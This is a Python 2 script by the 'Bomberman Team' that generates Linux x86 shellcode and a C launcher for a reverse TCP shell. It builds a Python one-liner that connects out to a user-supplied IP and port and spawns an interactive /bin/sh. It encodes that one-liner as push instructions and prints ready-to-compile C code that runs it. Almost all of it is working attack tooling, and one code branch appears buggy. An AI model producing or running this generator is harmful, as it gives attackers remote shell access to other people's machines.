import sys
import re

#Title :Linux ReverseTCPShell via PythonCodes


"""
 ___            _                             ___ 
| _ ) ___ _ __ | |__  ___ _ _ _ __  __ _ _ _ / __|
| _ \/ _ \ '  \| '_ \/ -_) '_| '  \/ _` | ' \\__ \
|___/\___/_|_|_|_.__/\___|_| |_|_|_\__,_|_||_|___/
 							 _____               
							|_   _|__ __ _ _ __  
							  | |/ -_) _` | '  \ 
							  |_|\___\__,_|_|_|_|

Members:
	Bomberman > B3mB4m < T-Rex

Should I rest ? LOL.No fucking way..
So what you think we can convert python reverse shell directly shellcodes ? 


Tested on : Ubuntu 14.04(x86)
Proof     : http://i.imgur.com/kfWwU6x.png
Python default path always some.So probably will works on all linux systems. 
"""




class B3mB4m(object):
	def __init__(self):
		self.command = '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);''' % (str(sys.argv[1]), str(sys.argv[2]))
		self.shellcode = r"\x31\xff\x6a\x0b\x58\x99\x57"
	def splitter(self, hexdump, pushword="None"):
		if pushword == "None":
			fixmesempai = re.findall('....?', hexdump)
			for x in fixmesempai[::-1]:
				first = str(x[::-1].encode("hex"))
				second = re.findall("..?", first)[::-1]
				minilist = ""
				for x in second:
					minilist += r"\x%s" % x		
				self.shellcode += r"\x68%s" % minilist
		else:
			first = str(x[::-1].encode("hex"))
			second = re.findall("..?", first)[::-1]
			for x in second:
				minilist = ""
				minilist += r"\x%s" % x
			self.shellcode += r"\x66\x68\x%s" % minilist

		self.shellcode += r"\x89\xe6\x52\x66\x68\x2d\x63\x89\xe1\x52\x68\x74\x68\x6f\x6e"
		self.shellcode += r"\x68\x6e\x2f\x70\x79\x68\x72\x2f\x62\x69\x68\x2f\x2f\x75\x73"
		self.shellcode += r"\xb0\x0b\x89\xe3\x52\x56\x51\x53\x89\xe1\xcd\x80"
		self.shellcode =  'char *shellcode = "%s";' % self.shellcode
		self.cplusplus()
	

	def logo(self):
		print """
Author : LOL.What you think ? 
Greetz : Itzik Kotler
""";	

	def cplusplus(self):
		self.logo()#Let me do that for you ^_^
		print """	
#include <stdio.h>
#include <string.h>

/*Coded by B3mB4m

gcc shell.c -o shell
./shell */


%s

int main(void){
	(*(void(*)()) shellcode)();}\n\n""" % (self.shellcode)
	

	def testmystring(self):
		if len(self.command)%4 != 0:
			dwordpart = self.command[0:(len(self.command)-len(self.command)%4)]
			wordpart = self.command[(len(self.command)-len(self.command)%4):len(self.command)]
			self.splitter( dwordpart)
			self.splitter(  wordpart, "WordTime")
		else:
			self.splitter( self.command)	
						                     
                                                 


if len(sys.argv) < 2:
	print "Usage reverse.py IP PORT"
	sys.exit()
else:
	B3mB4m().testmystring()
